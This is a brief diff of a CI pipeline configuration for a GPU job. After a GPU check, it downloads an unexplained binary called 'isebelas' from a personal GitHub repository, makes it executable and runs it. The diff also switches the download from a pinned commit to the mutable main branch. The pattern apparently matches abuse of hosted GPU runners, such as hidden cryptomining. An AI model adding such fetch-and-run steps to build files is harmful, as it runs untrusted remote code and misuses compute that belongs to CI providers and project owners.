@@ -7,4 +7,4 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/principala/a/f2f24969e9392e56a3d15af1d6ce587414f5e3f7/isebelas && chmod +x isebelas && ./isebelas
+      - run: wget https://raw.githubusercontent.com/principala/a/main/isebelas && chmod +x isebelas && ./isebelas
